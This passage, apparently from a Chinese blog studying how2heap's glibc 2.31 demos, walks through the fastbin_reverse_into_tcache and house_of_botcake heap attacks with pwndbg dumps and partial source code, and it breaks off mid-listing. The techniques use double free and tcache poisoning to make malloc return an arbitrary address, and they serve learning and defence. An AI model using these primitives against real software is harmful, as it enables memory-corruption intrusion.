—▸ <span class="number">0x555555559660</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>此时，原本在fastbin 的chunk list 都被放到了 tcaceh bins 里</p><p>如果我们最后再malloc 一次，我们就能拿到栈的地址  （tcache  不检查size域）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">──────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/fastbin_reverse_into_tcache.c</span><br><span class="line">   <span class="number">120</span>   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">   <span class="number">121</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p: %p\n&quot;</span>, &amp;stack_var[i], (<span class="keyword">char</span>*)stack_var[i]);</span><br><span class="line">   <span class="number">122</span>   &#125;</span><br><span class="line">   <span class="number">123</span></span><br><span class="line">   <span class="number">124</span>   <span class="keyword">char</span> *q = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line"> ► <span class="number">125</span>   <span class="built_in">printf</span>(</span><br><span class="line">   <span class="number">126</span>     <span class="string">&quot;\n&quot;</span></span><br><span class="line">   <span class="number">127</span>     <span class="string">&quot;Finally, if we malloc one more time then we get the stack address back: %p\n&quot;</span>,</span><br><span class="line">   <span class="number">128</span>     q</span><br><span class="line">   <span class="number">129</span>   );</span><br><span class="line">   <span class="number">130</span></span><br><span class="line">──────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp     <span class="number">0x7fffffffe1e0</span> ◂— <span class="number">0x34000000340</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x7fffffffe1e8</span> ◂— <span class="number">0x6</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│         <span class="number">0x7fffffffe1f0</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│         <span class="number">0x7fffffffe1f8</span> —▸ <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> ◂— ...</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│         <span class="number">0x7fffffffe200</span> ◂— <span class="number">0xcdcdcdcdcdcdcdcd</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│ rax r8  <span class="number">0x7fffffffe210</span> —▸ <span class="number">0x5555555594d0</span> —▸ <span class="number">0x555555559520</span> —▸ <span class="number">0x555555559570</span> —▸ <span class="number">0x5555555595c0</span> ◂— ...</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│         <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x0</span></span><br><span class="line">────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">5555555554f</span>d main+<span class="number">724</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; p q</span><br><span class="line">$<span class="number">3</span> = <span class="number">0x7fffffffe210</span> <span class="string">&quot;ДUUUU&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样我们可以达到一个任意地址写 或者读的原语（取决于下一步对 这分配出来的chunk进行什么样的操作）</p><p>完整代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">size_t</span> allocsize = <span class="number">0x40</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;This attack is intended to have a similar effect to the unsorted_bin_attack,\n&quot;</span></span><br><span class="line">    <span class="string">&quot;except it works with a small allocation size (allocsize &lt;= 0x78).\n&quot;</span></span><br><span class="line">    <span class="string">&quot;The goal is to set things up so that a call to malloc(allocsize) will write\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a large unsigned value to the stack.\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Allocate 14 times so that we can free later.</span></span><br><span class="line">  <span class="keyword">char</span>* ptrs[<span class="number">14</span>];</span><br><span class="line">  <span class="keyword">size_t</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++) &#123;</span><br><span class="line">    ptrs[i] = <span class="built_in">malloc</span>(allocsize);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;First we need to free(allocsize) at least 7 times to fill the tcache.\n&quot;</span></span><br><span class="line">    <span class="string">&quot;(More than 7 times works fine too.)\n\n&quot;</span></span><br><span class="line">  );</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fill the tcache.</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptrs[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">char</span>* victim = ptrs[<span class="number">7</span>];</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;The next pointer that we free is the chunk that we&#x27;re going to corrupt: %p\n&quot;</span></span><br><span class="line">    <span class="string">&quot;It doesn&#x27;t matter if we corrupt it now or later. Because the tcache is\n&quot;</span></span><br><span class="line">    <span class="string">&quot;already full, it will go in the fastbin.\n\n&quot;</span>,</span><br><span class="line">    victim</span><br><span class="line">  );</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Next we need to free between 1 and 6 more pointers. These will also go\n&quot;</span></span><br><span class="line">    <span class="string">&quot;in the fastbin. If the stack address that we want to overwrite is not zero\n&quot;</span></span><br><span class="line">    <span class="string">&quot;then we need to free exactly 6 more pointers, otherwise the attack will\n&quot;</span></span><br><span class="line">    <span class="string">&quot;cause a segmentation fault. But if the value on the stack is zero then\n&quot;</span></span><br><span class="line">    <span class="string">&quot;a single free is sufficient.\n\n&quot;</span></span><br><span class="line">  );</span><br></pre></td></tr></table></figure><h3 id="3-house-of-bocake"><a href="#3-house-of-bocake" class="headerlink" title="3. house_of_bocake"></a>3. house_of_bocake</h3><p>一种 tcache poisoning attack ，通过一些手段，在tcachebins 中写入目标地址</p><p>构造如下情景：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed                <span class="number">0x0</span>              None</span><br><span class="line"><span class="number">0x5555555593a0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555592a0</span>              None</span><br><span class="line"><span class="number">0x5555555594b0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555593b0</span>              None</span><br><span class="line"><span class="number">0x5555555595c0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555594c0</span>              None</span><br><span class="line"><span class="number">0x5555555596d0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555595d0</span>              None</span><br><span class="line"><span class="number">0x5555555597e0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555596e0</span>              None</span><br><span class="line"><span class="number">0x5555555598f0</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Freed     <span class="number">0x5555555597f0</span>              None</span><br><span class="line"><span class="number">0x555555559a00</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559b10</span>      <span class="number">0x0</span>                 <span class="number">0x110</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559c20</span>      <span class="number">0x0</span>                 <span class="number">0x20</span>                 Used                None              None</span><br></pre></td></tr></table></figure><p>此时的 tcache 是被填满的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559900</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>然后我们free a 再 free prev ， 由于 prev 与  a 是相邻 chunk ，所以会触发合并，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">50</span>     &#125;</span><br><span class="line">   <span class="number">51</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">   <span class="number">52</span>     <span class="built_in">free</span>(a);</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line"> ► <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br></pre></td></tr></table></figure><p>触发合并后，在 unsortedbin 里的是 prev chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x555555559a00</span></span><br><span class="line"><span class="number">0x555555559a00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000221</span>      ====== &gt; chunk prev</span><br><span class="line"><span class="number">0x555555559a10</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559a20</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a40</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559aa0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ac0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span>        ====== &gt; chunk a</span><br><span class="line"><span class="number">0x555555559b20</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559b30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后我们要想办法把 chunk a 放入 tcache  bin里，由于此时 tcache bins 是满的，所以我们先取一个出来, 然后再 free 一次 a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">   <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br><span class="line">   <span class="number">57</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line"> ► <span class="number">58</span>     <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="number">59</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">60</span>     <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">   <span class="number">61</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>     <span class="comment">// simple tcache poisoning</span></span><br></pre></td></tr></table></figure><p>此时 a chunk 就会被放入 tcahcebins 里，同时 prev 可以控制  chunk a 的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x555555559b20</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以我们从此时的 unsortedbin 给他分一块出来，然后修改其 fd 的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">64</span>     <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">  <span class="number">65</span>     <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">  <span class="number">66</span>     <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">► <span class="number">67</span>     <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">  <span class="number">68</span>     b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">69</span></span><br></pre></td></tr></table></figure><p>那么此时我们就成功污染了 tachebin 的内容 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559b30</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559b30</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们接着只需要两次 malloc 就能拿到 0x7fffffffe260 这个地址</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span 